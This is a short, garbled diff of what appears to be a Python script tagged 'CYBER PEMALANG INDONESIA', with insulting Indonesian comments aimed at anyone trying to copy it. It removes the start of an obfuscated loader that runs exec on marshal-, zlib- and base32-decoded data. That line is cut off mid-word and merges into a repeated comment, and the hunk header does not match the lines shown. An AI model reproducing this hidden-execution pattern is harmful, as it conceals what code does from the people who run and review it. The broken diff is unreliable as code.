@@ -1,8 +1,3 @@
-#MAU NGAPAIN ANJING
-#MAU RECODE?,DASAR BODOH
-#CYBER PEMALANG INDONESIA
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b32decod#MAU NGAPAIN ANJING
 #MAU RECODE?,DASAR BODOH
 #CYBER PEMALANG INDONESIA
 import marshal,zlib,base64
